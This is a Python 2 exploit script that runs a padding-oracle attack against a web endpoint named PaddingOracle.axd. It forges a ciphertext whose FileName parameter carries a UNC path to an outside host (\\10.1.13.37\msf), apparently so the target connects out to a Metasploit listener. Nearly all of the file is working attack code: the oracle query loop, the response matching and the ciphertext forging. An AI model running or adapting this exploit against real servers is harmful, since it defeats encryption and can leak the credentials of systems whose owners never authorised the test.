from pypadbuster import *
from base64 import b64encode,b64decode

import HTMLParser
htmlparser = HTMLParser.HTMLParser()

import httplib2
from urllib import urlencode
import socks

import re

import sys

block_size = 16

# trick the target into opening a network connection by feeding it a UNC path
test_string = r'\\10.1.13.37\msf'

#[*] Going to produce 2 blocks: '\\10.1.13.37\ms\x01f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f'

def padding_oracle(iv, ciphertext):
  target = b64encode(iv + ciphertext)
  while True:
    http_client = httplib2.Http(
      # I usually run it through burp to have logs of all requests I make, but
      # the line below can of course be commented out:
      proxy_info = httplib2.ProxyInfo(socks.PROXY_TYPE_HTTP, '127.0.0.1', 8080)
    )

    h, body = http_client.request(
      'http://localhost:9999/PaddingOracle.axd?%s' %
      urlencode({ 'SomeParam': '123',
		  'FileName': target
      }),
      headers = {
	'Cookie': 'MyAuthCookie=letmein'
      }
    )
    if re.search('orgot Password', body):
      print 'Session expired :-( Exiting.'
      sys.exit(1)
    ### TODO example code for using the leaked blocks commented out, need to fix the code for leaking more than one block
    #m = re.search("<title>'(?P<block>.*?)' is not a valid virtual path.", body)
    #if m:
    #  leaked = htmlparser.unescape(m.groupdict()['block'])
    #  if len(leaked) == block_size:
	#print 'Leaked a block: %s' % leaked.encode('hex')
	#return leaked
      #else:
	#print "Thought we leaked a block, but size doesn't match: %s" % leaked.encode('hex')
	#return True
    if re.search('Padding', body):
      return False    
    elif h['status'] == '200' or re.search('Illegal characters in path', body) or re.search("<title>'(?P<block>.*?)' is not a valid virtual path.", body):
      return True
    # if none of the above:
    # print an error message and retry. if you failed to recognize all possible outcomes,
    # you can add code to support the unexpected case and resume with the partial xor key.
    # We should probably log this to a file to prevent the "retrying" messages from erasing
    # the scrollback log of xor keys.
    # For now you can use iv (minus the experimental leftmost byte)
    # and ciphertext along pad_string_pkcs7(test_string) to calculate the partial_xor_key
    # TODO: not really acceptable, this should be changed to print the known good partial_xor_key :-)
    # (that will happen in the real tool)
    print 'Retrying request because it failed (I was trying %s + %s): %s\n==========Body:\n%s' % (iv.encode('hex'), ciphertext.encode('hex'), h, body)

(new_iv, new_ciphertext) = generate_ciphertext(
  block_size=block_size,
  wantedstr=test_string,
  padding_oracle=padding_oracle,
  partial_xor_key=''.decode('hex')
  )
print '\x1b[32;1m[*]\x1b[0m         iv:  %s' % new_iv.encode('hex')
print '\x1b[32;1m[*]\x1b[0m ciphertext:  %s' % new_ciphertext.encode('hex')
